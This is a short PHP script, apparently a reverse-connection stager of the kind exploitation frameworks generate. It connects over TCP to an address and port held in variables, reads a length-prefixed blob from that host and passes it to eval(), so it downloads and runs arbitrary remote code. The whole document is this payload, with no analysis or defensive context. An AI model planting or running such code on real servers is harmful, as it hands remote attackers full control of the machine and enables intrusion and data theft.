<?php
$msgsock_type = 'stream';
$msgsock = @stream_socket_client("tcp://{$ipaddr}:{$port}");
$len = fread($msgsock, 4);

$a = unpack("Nlen", $len);
$len = $a['len'];
$buffer = '';
while (strlen($buffer) < $len) 
	$buffer .= fread($msgsock, $len-strlen($buffer)); 

eval($buffer);
echo "[*] Connection Terminated";